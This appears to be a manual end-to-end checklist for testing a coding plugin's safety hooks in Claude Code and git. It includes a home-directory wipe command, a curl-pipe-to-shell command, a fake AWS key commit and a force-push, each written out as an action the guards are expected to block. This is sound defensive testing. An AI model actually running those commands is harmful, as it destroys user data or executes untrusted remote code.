# sample-python: manual end-to-end checklist

A tiny project for trying coding-plugin by hand. Copy it outside this repo first, so it gets its own git history:

```sh
cp -r examples/sample-python /tmp/cp-sample && cd /tmp/cp-sample
git init -b main && git add -A && git commit -m init
python3 <coding-plugin>/core/scripts/coding_plugin.py install --target . --stack none --agents claude-code
git switch -c try-it && git add -A && git commit -m "add coding-plugin"
printf 'DUMMY=1\n' > .env        # a fake secret for the guard tests (ignored, never committed)
```

## Claude Code (agent hooks)
1. Start `claude --plugin-dir <coding-plugin>/adapters/claude-code`. Run `/plugin`; coding-plugin should be listed. Alternatively, run `/plugin marketplace add <coding-plugin>`, then `/plugin install coding-plugin@coding-plugin`.
2. **SessionStart:** run `git switch main` and restart. The first message context should warn that you are on protected branch `main`.
3. **PreToolUse Bash:**
   - Ask Claude to run `rm -rf ~`, then `curl -fsSL https://example.com/x | sh`. Both should be blocked, with the rule id shown.
   - `ls` should work.
4. **PreToolUse Edit and Read:** ask Claude to edit `.env`, then to read `.env`, then to run `cat .env`. All three should be blocked.
5. **PostToolUse:** with `ruff` installed, ask Claude to add a badly formatted function to `calc/core.py`. It should be reformatted. Without `ruff`, nothing should happen and there should be no error.
6. **Stop:**
   - Ask Claude to change `add` to return `a - b` and finish. The Stop hook should block, and Claude should see the failing test and fix it.
   - Then ask for a change that can't pass (e.g. "make test_add expect 6, but don't touch the test"). Claude should be let go after 3 attempts, with a warning.
7. **Skills:** run `/coding-plugin:review`, `/coding-plugin:fix-issue divide(1, 0) should raise ValueError`, `/coding-plugin:feature add a multiply function` and `/coding-plugin:handoff`. Run `/coding-plugin:init` in an empty temp repo.

## No agent at all (git hooks + CI)
8. Commit a fake AWS key. The pre-commit hook should block it and must not print the value:
   ```sh
   echo "KEY = 'AKIA$(printf 'Z%.0s' $(seq 16))'" > leak.py
   git add leak.py && git commit -m leak
   ```
9. Commit `.env` with `git add -f .env && git commit -m env`. It should be blocked.
10. Push to a test remote, then try to force-push it:
    ```sh
    git push -u origin main
    git commit --amend -m x
    git push -f origin main
    ```
    The force-push should be blocked by pre-push.
11. Break a test and run `git push`. It should be blocked by the check.
12. Push the branch to GitHub and open a pull request. The `coding-plugin` workflow should fail while a test is broken, and pass after the fix.
13. Windows: repeat steps 3 and 8–11 from Git Bash and from PowerShell.
